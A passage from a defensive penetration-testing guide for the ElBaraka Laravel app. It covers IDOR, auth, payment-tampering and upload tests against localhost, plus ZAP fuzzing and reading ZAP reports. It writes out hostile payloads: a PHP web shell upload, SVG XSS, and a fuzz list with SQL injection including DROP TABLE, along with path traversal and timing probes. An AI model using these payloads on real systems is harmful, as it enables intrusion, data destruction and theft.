Authorization: Bearer TOKEN_A

```

```http
# IDOR Test 10: Order invoice for User B's order
GET http://localhost:8000/api/v1/orders/42/invoice HTTP/1.1
Host: localhost:8000
Accept: application/json
Authorization: Bearer TOKEN_A

```

**For EVERY test above:** If you can access another user's data, you MUST add ownership checks in the controller. Example fix:

```php
// In the controller:
$order = Order::findOrFail($id);
if ($order->user_id !== auth()->id()) {
    abort(403, 'Access denied');
}
```

### Attack 4: Broken Authentication

```http
# Test 1: Access protected endpoint without ANY token
GET http://localhost:8000/api/v1/profile HTTP/1.1
Host: localhost:8000
Accept: application/json

```
**Expected:** 401 Unauthorized

```http
# Test 2: Use an expired/invalid token
GET http://localhost:8000/api/v1/profile HTTP/1.1
Host: localhost:8000
Accept: application/json
Authorization: Bearer invalid-token-123456

```
**Expected:** 401 Unauthorized
**Bad:** 200 OK or 500 Server Error

```http
# Test 3: Use a modified token (change one character)
# If your real token is "1|abc123", try:
GET http://localhost:8000/api/v1/profile HTTP/1.1
Host: localhost:8000
Accept: application/json
Authorization: Bearer 1|abc124

```
**Expected:** 401 Unauthorized

```http
# Test 4: Access admin routes with regular user token
GET http://localhost:8000/api/v1/admin/orders HTTP/1.1
Host: localhost:8000
Accept: application/json
Authorization: Bearer REGULAR_USER_TOKEN

```
**Expected:** 403 Forbidden

```http
# Test 5: Access driver routes with regular user token
GET http://localhost:8000/api/v1/driver/dashboard HTTP/1.1
Host: localhost:8000
Accept: application/json
Authorization: Bearer REGULAR_USER_TOKEN

```
**Expected:** 403 Forbidden

```http
# Test 6: Brute force login (send 20 login requests rapidly)
# Use Postman Runner or ZAP Fuzzer for this
POST http://localhost:8000/api/v1/auth/login HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json

{"email": "admin@elbaraka.com", "password": "wrong-password-attempt-X"}
```
**Expected:** After 60 attempts in 1 minute → 429 Too Many Requests
**Recommended:** Should block after 5-10 attempts

```http
# Test 7: OTP brute force (try all 6-digit codes)
POST http://localhost:8000/api/v1/auth/verify-email HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json

{"email": "test@test.com", "otp": "000001"}
```
Then try 000002, 000003... etc. With rate limit of 60/min, an attacker can try 60 codes per minute. That's all 1,000,000 6-digit codes in ~11.5 days — or all codes in 16.7 hours if OTPs are 4 digits. **OTP should expire after 10 minutes AND lock after 5 wrong attempts.**

### Attack 5: Mass Assignment

```http
# Test: Try to make yourself an admin during registration
POST http://localhost:8000/api/v1/auth/register HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json

{"name": "Hacker", "email": "hacker@test.com", "password": "Hack123!!", "password_confirmation": "Hack123!!", "phone": "+201999999999", "role": "super_admin", "is_admin": true, "is_verified": true}
```
**Expected:** Extra fields (role, is_admin, is_verified) should be IGNORED
**VULNERABLE if:** User is created with admin role

```http
# Test: Try to change your role via profile update
PUT http://localhost:8000/api/v1/profile HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{"name": "Normal User", "role": "super_admin", "is_admin": true}
```
**Expected:** Role should not change

### Attack 6: Rate Limit Bypass

```http
# Test 1: Bypass via X-Forwarded-For header
POST http://localhost:8000/api/v1/auth/login HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json
X-Forwarded-For: 1.2.3.4

{"email": "test@test.com", "password": "wrong"}
```
Send 60+ requests, changing X-Forwarded-For to a different IP each time.
**VULNERABLE if:** Rate limiting resets with each new X-Forwarded-For value

```http
# Test 2: Bypass via X-Real-IP
POST http://localhost:8000/api/v1/auth/login HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json
X-Real-IP: 5.6.7.8

{"email": "test@test.com", "password": "wrong"}
```

### Attack 7: Payment Tampering

```http
# Test 1: Modify order amount in checkout
POST http://localhost:8000/api/v1/checkout/process-payment HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json
Authorization: Bearer YOUR_TOKEN

{"order_id": 1, "payment_method": "card", "amount": 1}
```
**Expected:** Server calculates the real total, ignores client-sent amount
**VULNERABLE if:** Order is placed with the wrong amount

```http
# Test 2: Replay a Paymob webhook (try to mark an unpaid order as paid)
POST http://localhost:8000/api/v1/paymob/processed HTTP/1.1
Host: localhost:8000
Content-Type: application/json

{"obj": {"id": 99999, "success": true, "amount_cents": 10000, "order": {"id": 1}}}
```
**Expected:** 403 Invalid signature (HMAC check fails)
**VULNERABLE if:** Order status changes to paid

```http
# Test 3: Negative amount refund (steal money)
POST http://localhost:8000/api/v1/admin/refunds HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json
Authorization: Bearer ADMIN_TOKEN

{"order_id": 1, "amount": -50000}
```
**Expected:** Validation error — amount must be positive

### Attack 8: File Upload Attacks

```http
# Test 1: Upload PHP file as avatar
POST http://localhost:8000/api/v1/profile/avatar HTTP/1.1
Host: localhost:8000
Accept: application/json
Authorization: Bearer YOUR_TOKEN
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```
**Expected:** Rejected — invalid file type
**VULNERABLE if:** File is uploaded and accessible

```http
# Test 2: Upload oversized file (100MB image)
# Use Postman for this — create a large dummy file
# Expected: Rejected with file size error
```

```http
# Test 3: Upload SVG with embedded JavaScript
POST http://localhost:8000/api/v1/profile/avatar HTTP/1.1
Host: localhost:8000
Accept: application/json
Authorization: Bearer YOUR_TOKEN
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="evil.svg"
Content-Type: image/svg+xml

<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
<script>alert('XSS via SVG')</script>
</svg>
------WebKitFormBoundary--
```
**Expected:** Rejected or SVG script stripped

---

## 8. Phase 6: API Fuzzing with ZAP

> **Fuzzing = sending thousands of malicious payloads to a single parameter to find vulnerabilities.**

### How to Fuzz an Endpoint

1. In ZAP's **History** tab, find a request you want to fuzz (e.g., the login POST)
2. Right-click it → **"Fuzz..."**
3. The Fuzzer dialog opens showing the raw request
4. **Select the text you want to fuzz** (e.g., highlight the email value `"zaptest@test.com"`)
5. Click **"Add..."** (Add Payload)
6. Choose payload type:

| Payload Type | Use For | What It Does |
|-------------|---------|-------------|
| **File Fuzzers → jbrofuzz → XSS** | XSS testing | Tries 100+ XSS payloads |
| **File Fuzzers → jbrofuzz → SQL Injection** | SQLi testing | Tries 100+ SQL injection strings |
| **File Fuzzers → dirbuster** | Path traversal | Tries to access hidden files |
| **FuzzDB → attack → all-attacks** | Everything | Comprehensive attack dictionary |
| **Custom** | Specific values | Your own list of values |

7. Click **"Add"** → **"OK"**
8. Click **"Start Fuzzer"**
9. Watch the results — look for:
   - **Response codes that differ** (e.g., 500 when most are 422 = potential vulnerability)
   - **Response sizes that differ** (might indicate data leakage)
   - **Response times that differ** (might indicate time-based SQLi)

### Fuzz These Parameters:

| Endpoint | Parameter to Fuzz | Attack Type |
|----------|------------------|-------------|
| `POST /auth/login` | `email` field | SQL Injection |
| `POST /auth/login` | `password` field | SQL Injection |
| `GET /products?search=` | `search` query param | SQL Injection + XSS |
| `POST /complaints` | `message` field | XSS |
| `POST /reviews` | `comment` field | XSS |
| `PUT /profile` | `name` field | XSS |
| `POST /addresses` | `address_line_1` | XSS |
| `GET /orders/{id}` | `{id}` path param | IDOR (use numbers 1-100) |
| `GET /addresses/{id}` | `{id}` path param | IDOR |
| `POST /admin/products` | `name` field | XSS |
| `PUT /admin/pages/{id}` | `content_en` field | Stored XSS |
| `POST /promo-codes/validate` | `code` field | Promo enumeration |
| `POST /auth/verify-email` | `otp` field | OTP brute force |

### Custom Fuzzer Payloads You Should Use

Create a text file `d:\elbarakkaaaaa\fuzz-payloads.txt`:

```
' OR '1'='1
" OR "1"="1
' OR 1=1--
' UNION SELECT NULL--
'; DROP TABLE users;--
1; WAITFOR DELAY '0:0:5'--
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
{{7*7}}
${7*7}
../../../etc/passwd
..\..\..\..\windows\win.ini
%00
%0d%0a
null
undefined
NaN
-1
0
99999999
' AND SLEEP(5)--
" AND SLEEP(5)--
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

In ZAP Fuzzer → Add Payload → Type: **"File"** → Browse to this file.

---

## 9. Phase 7: Frontend Mobile App — Proxy Intercept

> **Goal:** Intercept all traffic from your mobile app through ZAP to see exactly what data is being sent and received.

### Option A: Using Android Emulator

#### Step 1: Set Up Emulator Proxy

1. Open Android Studio → Device Manager → Start your emulator
2. In the emulator, go to **Settings → Network & Internet → Wi-Fi**
3. Long-press your WiFi network → **Modify network**
4. **Proxy:** Manual
   - **Proxy hostname:** `10.0.2.2` (this is your PC from the emulator)
   - **Proxy port:** `8080` (ZAP's port)
5. Save

#### Step 2: Install ZAP Certificate on Emulator

1. In ZAP: **Tools → Options → Network → Server Certificates → Save**
2. Push certificate to emulator:
   ```powershell
   adb push zap_root_ca.cer /sdcard/
   ```
3. On emulator: **Settings → Security → Install from storage → Select the certificate**

#### Step 3: Run the App

```powershell
cd d:\elbarakkaaaaa\frontend
npx expo start
# Press 'a' to open in Android emulator
```

Now every HTTP request the app makes goes through ZAP. Browse the entire app:
- Login
- Browse products
- Add to cart
- Checkout
- Create order
- View profile
- etc.

ZAP captures everything in the **History** tab.

### Option B: Using a Real Phone (Same WiFi)

1. Connect your phone to the **same WiFi** as your PC
2. Find your PC's IP: run `ipconfig` in PowerShell, look for IPv4 Address (e.g., `192.168.1.100`)
3. On phone: **Settings → WiFi → Your Network → Proxy → Manual**
   - Host: `192.168.1.100`
   - Port: `8080`
4. On phone browser: go to `http://192.168.1.100:8080` → Download and install ZAP's certificate
5. Open the ElBaraka app → All traffic goes through ZAP

### What to Look For in Intercepted Traffic

| Check | What to Look For | Severity |
|-------|-----------------|----------|
| Token in URL | Authorization token should NEVER be in the URL query string | HIGH |
| Passwords in plaintext | Login POST should be over HTTPS, password should not appear in URL | HIGH |
| Sensitive data in logs | Check if credit card numbers, passwords appear in any request | CRITICAL |
| Unnecessary data | Does the profile endpoint return more fields than the UI needs? | MEDIUM |
| Missing auth on requests | Any request to a protected endpoint without Bearer token | HIGH |
| Large responses | Product list returning 1000 items? Needs pagination | LOW |
| Hardcoded secrets | API keys, secrets visible in HTTP headers or responses | CRITICAL |

---

## 10. How to Read & Fix ZAP Results

### Understanding Alert Severity

| Color | Severity | Meaning | Action |
|-------|----------|---------|--------|
| 🔴 Red | **HIGH** | Directly exploitable vulnerability | **FIX IMMEDIATELY — block deployment** |
| 🟠 Orange | **MEDIUM** | Significant vulnerability or security weakness | **Fix before production** |
| 🟡 Yellow | **LOW** | Minor issue, defense-in-depth | Fix if time allows |
| 🔵 Blue | **INFO** | Informational, not a vulnerability | Review but no action needed |

### Common ZAP Alerts & How to Fix Them

#### HIGH Severity

| Alert | Meaning | Fix in Your Code |
|-------|---------|-----------------|
| **SQL Injection** | Attacker can read/modify database | Use Eloquent parameterized queries, never `DB::raw()` with user input |
| **Cross-Site Scripting (Reflected)** | Attacker can inject script via URL | Escape all output with `htmlspecialchars()`, use `{{ }}` in Blade (auto-escapes) |
| **Cross-Site Scripting (Stored)** | Malicious script stored in DB and served to users | Sanitize input before storage `strip_tags()`, use DOMPurify on frontend |
| **Remote Code Execution** | Attacker can execute code on server | Validate file uploads strictly, never `eval()` user input |
| **Path Traversal** | Attacker can read arbitrary files | Validate file paths, never use user input directly in `file_get_contents()` |
| **Remote File Inclusion** | Attacker can load malicious files | Never use user input in `include()` or `require()` |

#### MEDIUM Severity

| Alert | Meaning | Fix |
|-------|---------|-----|
| **Missing Anti-CSRF Tokens** | Forms vulnerable to cross-site request forgery | Your API uses Bearer tokens (not cookies), so CSRF doesn't apply to API. If ZAP flags this on the admin dashboard HTML forms, it's a false positive since you use SPA + token auth |
| **Content Security Policy Not Set** | No CSP header restricts script sources | Add CSP header in SecurityHeaders middleware: `Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'` |
| **X-Content-Type-Options Missing** | Browser might MIME-sniff responses | ✅ Already set in your SecurityHeaders middleware |
| **Strict-Transport-Security Not Set** | No HSTS header | ✅ Already set in production in SecurityHeaders middleware |
| **Cookie Without Secure Flag** | Cookie sent over HTTP | Set in `.env`: `SESSION_SECURE_COOKIE=true` |
| **Cookie Without SameSite** | CSRF via cross-site cookie | Set in `.env`: `SESSION_SAME_SITE=strict` |
| **Server Leaks Version** | Server header reveals software/version | In Nginx config: `server_tokens off;` — In PHP: `expose_php = Off` |
| **Directory Listing Enabled** | Can browse server directories | In Nginx: `autoindex off;` |

#### LOW / INFORMATIONAL

| Alert | Meaning | Fix |
|-------|---------|-----|
| **X-Frame-Options Not Set** | Page can be embedded in iframe | ✅ Already set to DENY in SecurityHeaders |
| **Incomplete or No Cache-control** | Sensitive pages might be cached by browser | Add `Cache-Control: no-store, no-cache` to sensitive endpoints |
| **Big Redirect Detected** | Response body included in redirect | Not a vulnerability, just informational |
| **Information Disclosure - Debug Error** | Stack trace in error response | Set `APP_DEBUG=false` in production |
| **Timestamp Disclosure** | Server time leaked | Usually harmless, no action needed |
| **User Agent Fuzzer** | Different responses per User-Agent | Usually harmless |

### Common False Positives (Ignore These)

| ZAP Says | Why It's False Positive |
|----------|----------------------|
| "Missing Anti-CSRF Tokens" on API | Your API uses Bearer tokens, not cookies. CSRF doesn't apply |
| "Application Error Disclosure" on 422 | Laravel validation returns error messages — this is expected behavior |
| "Cookie Without Secure Flag" on localhost | Only applies to production (HTTPS) |
| "Non-Storable Content" | API responses shouldn't be cached anyway |

---

## 11. Complete Attack Scenarios for All 3 Systems

### System 1: Backend API — Complete Attack Checklist

| # | Attack | Endpoint | How to Test | Expected Safe Result |
|---|--------|----------|-------------|---------------------|
| 1 | Unauthenticated access | `GET /api/v1/profile` | Send without token | 401 |
| 2 | Unauthenticated access | `GET /api/v1/orders` | Send without token | 401 |
| 3 | Unauthenticated access | `GET /api/v1/admin/orders` | Send without token | 401 |
| 4 | Regular user → admin endpoint | `GET /api/v1/admin/*` | User token on admin route | 403 |
| 5 | Regular user → driver endpoint | `GET /api/v1/driver/*` | User token on driver route | 403 |
| 6 | IDOR — other user's order | `GET /api/v1/orders/{other_id}` | User A token, User B order | 403 or 404 |
| 7 | IDOR — other user's address | `GET /api/v1/addresses/{other_id}` | User A token, User B address | 403 or 404 |
| 8 | IDOR — cancel other's order | `POST /api/v1/orders/{other_id}/cancel` | User A token | 403 |
| 9 | IDOR — delete other's review | `DELETE /api/v1/reviews/{other_id}` | User A token | 403 |
| 10 | IDOR — delete other's payment method | `DELETE /api/v1/payment-methods/{other_id}` | User A token | 403 |
| 11 | SQLi — login | `POST /api/v1/auth/login` | `email: ' OR 1=1--` | 422 validation |
| 12 | SQLi — product search | `GET /api/v1/products?search='` | SQL in search param | Normal/empty results |
| 13 | SQLi — order ID | `GET /api/v1/orders/1 OR 1=1` | SQL in path | 404 |
| 14 | XSS — profile name | `PUT /api/v1/profile` | `<script>` in name | Stored escaped |
| 15 | XSS — complaint | `POST /api/v1/complaints` | `<script>` in message | Stored escaped |
| 16 | XSS — review | `POST /api/v1/reviews` | `<script>` in comment | Stored escaped |
| 17 | Mass assignment — registration | `POST /api/v1/auth/register` | Add `role: admin` | Role ignored |
| 18 | Mass assignment — profile | `PUT /api/v1/profile` | Add `role: admin` | Role ignored |
| 19 | Brute force — login | `POST /api/v1/auth/login` | 100 wrong passwords | 429 after limit |
| 20 | Brute force — OTP | `POST /api/v1/auth/verify-email` | Try many OTP codes | 429 after limit |
| 21 | Payment amount tampering | `POST /api/v1/checkout/process-payment` | Send `amount: 1` | Server calculates real amount |
| 22 | Webhook replay | `POST /api/v1/paymob/processed` | Replay old payload | 403 invalid HMAC |
| 23 | Webhook tampering | `POST /api/v1/paymob/processed` | Modify payload field | 403 invalid HMAC |
| 24 | File upload — PHP shell | `POST /api/v1/profile/avatar` | Upload .php file | Rejected |
| 25 | File upload — SVG XSS | `POST /api/v1/profile/avatar` | SVG with script | Rejected or stripped |
| 26 | File upload — oversized | `POST /api/v1/profile/avatar` | 100MB file | Rejected |
| 27 | Negative amount | `POST /api/v1/admin/refunds` | `amount: -500` | Validation error |
| 28 | Rate limit bypass | `POST /api/v1/auth/login` | X-Forwarded-For spoofing | Rate limit still applies |
| 29 | Token in URL | Any request | Check history for tokens in URLs | Never in URL |
| 30 | Debug info leak | Cause a 500 error | `GET /api/v1/products/999999` | Generic error, no stack trace |

### System 2: Admin Dashboard — Complete Attack Checklist

| # | Attack | Where | How to Test | Expected |
|---|--------|-------|-------------|----------|
| 1 | XSS via product name | Products page | Create product with `<script>` name, view it | Script is escaped/DOMPurified |
| 2 | XSS via customer data | Customers page | View customer with XSS in their name | Escaped |
| 3 | XSS via complaint message | Support page | View ticket with XSS in message | DOMPurify sanitizes it |
| 4 | XSS via CMS content | Content page | Save page with XSS, view on frontend | Sanitized |
| 5 | XSS via notification content | Notifications | Broadcast notification with XSS | Escaped |
| 6 | Stored XSS via review | Reviews | View review with XSS in comment | Escaped |
| 7 | DOM XSS via URL params | Any page with URL params | Add `?q=<script>alert(1)</script>` to URL | No execution |
| 8 | CSRF on state-changing actions | Order status change | Use a CSRF tool — but API uses Bearer tokens, so this should be safe | Not applicable (token auth) |
| 9 | Session hijacking | LocalStorage | Check if token is accessible via XSS | If XSS exists, token is at risk |
| 10 | Unauthorized page access | URL manipulation | Navigate to `/admin/users` as `customer_support` role | Should be restricted by ProtectedRoute |
| 11 | JavaScript library vulns | Retire.js scan | ZAP Retire.js addon checks all loaded JS | Update outdated libs |
| 12 | Sensitive data in console | Browser console | Open DevTools → Console → Look for tokens/passwords | None should appear |
| 13 | Source map exposure | Production build | Try to access `.map` files | Should not exist in production build |
| 14 | Token in localStorage | DevTools → Application | Check localStorage for tokens | Tokens exist but should be protected by XSS prevention |
| 15 | Click-jacking | Load admin in iframe | Create HTML with `<iframe src="http://localhost:3000">` | Should block (X-Frame-Options: DENY) |

### System 3: Mobile App — Complete Attack Checklist

| # | Attack | Where | How to Test | Expected |
|---|--------|-------|-------------|----------|
| 1 | Token in AsyncStorage | Device storage | Use Android Debug Bridge to read AsyncStorage | Token should be encrypted or in SecureStore |
| 2 | SSL Pinning | All API calls | MitM with ZAP proxy | Ideally should fail (SSL pinning), currently not implemented |
| 3 | Deep link injection | `elbaraka://product/` | Send deep link `elbaraka://product/<script>` | Should sanitize/validate |
| 4 | Credential storage | Biometric auth | Check SecureStore for plaintext passwords | Should be encrypted |
| 5 | API key in JS bundle | Decompile APK | Extract APK, search for API keys | Only public keys should be present |
| 6 | Network traffic interception | All API calls | Proxy through ZAP | Check no sensitive data in headers/URLs |
| 7 | Screen capture prevention | Payment screens | Take screenshot during payment | Sensitive data should be hidden or app should prevent screenshot |
| 8 | Debug mode | Production APK | Check if debug tools work on prod APK | Should not work |
| 9 | Root/Jailbreak detection | Rooted device | Install on rooted device | App should still work but may warn user |
| 10 | Offline data security | AsyncStorage data | Read device files while offline | No sensitive data stored unencrypted |

---

## 12. ZAP Reports — Generate & Interpret

### Generate a Report

1. After all scans are done, go to menu: **Report → Generate Report...**
2. Choose format:
   - **HTML Report** — Best for reading, includes details and evidence
   - **XML Report** — For importing into other tools
   - **JSON Report** — For programmatic processing
   - **Markdown Report** — Easy to share on GitHub
3. Choose **Template**: "Traditional HTML Report with Requests and Responses" (most detailed)
4. Click **"Generate Report"**
5. Save it as `d:\elbarakkaaaaa\security-report.html`
6. Open it in Chrome

### Understanding the Report

The report is organized by severity:

```
📊 REPORT SUMMARY
├── 🔴 High Alerts: X     ← FIX ALL OF THESE
├── 🟠 Medium Alerts: X   ← Fix before production  
├── 🟡 Low Alerts: X      ← Fix if time allows
└── 🔵 Info Alerts: X     ← Review only

📋 ALERT DETAILS
├── Alert Name
├── Risk: High/Medium/Low
├── Confidence: High/Medium/Low
├── Description: What the vulnerability is
├── URL: Which endpoint is affected
├── Parameter: Which input parameter is vulnerable
├── Evidence: The actual request/response showing the vulnerability
├── Solution: How to fix it
└── Reference: Links to learn more (OWASP, CWE)
```

### What a Good Report Looks Like

```
✅ ACCEPTABLE for production:
- 0 High alerts
- 0-2 Medium alerts (with justification — e.g., false positives)
- Any number of Low/Info alerts

❌ NOT acceptable for production:
- Any High alerts
- More than 3 Medium alerts that aren't false positives
```

### Save Multiple Reports

Generate separate reports for each scan context:

```
d:\elbarakkaaaaa\reports\
├── security-report-public-api.html       (Phase 1)
├── security-report-user-api.html         (Phase 2)
├── security-report-admin-api.html        (Phase 3)
├── security-report-admin-dashboard.html  (Phase 4)
└── security-report-mobile-app.html       (Phase 7)
```

---

## Quick Reference: ZAP Keyboard Shortcuts

| Shortcut | Action |
|----------|--------|
| `Ctrl+L` | Open URL in browser |
| `Ctrl+R` | Open Manual Request Editor |
| `Ctrl+H` | Show History tab |
| `Ctrl+Shift+A` | Show Alerts tab |
| `Ctrl+Alt+S` | Start Active Scan |

---

## Time Estimate

| Phase | What | Time Needed |
|-------|------|-------------|
| Phase 1 | Public API automated scan | 30 min setup + 15 min scan |
| Phase 2 | User API authenticated scan | 20 min setup + 30 min scan |
| Phase 3 | Admin API authenticated scan | 20 min setup + 30 min scan |
| Phase 4 | Admin dashboard web scan | 30 min + 30 min scan |
| Phase 5 | Manual testing (ALL attacks) | **2-3 hours** |
| Phase 6 | API fuzzing | 1-2 hours |
| Phase 7 | Mobile app proxy | 1 hour |
| Reports | Generate & review | 30 min |
| **Total** | | **6-8 hours** |

**Prioritize:** Phase 5 (manual testing) is the most important. Automated scans miss business logic flaws like IDOR and payment tampering.

---

*This guide covers all OWASP Top 10 vulnerability categories as they apply to ElBaraka's 3 systems (Backend API, Admin Dashboard, Mobile App).*
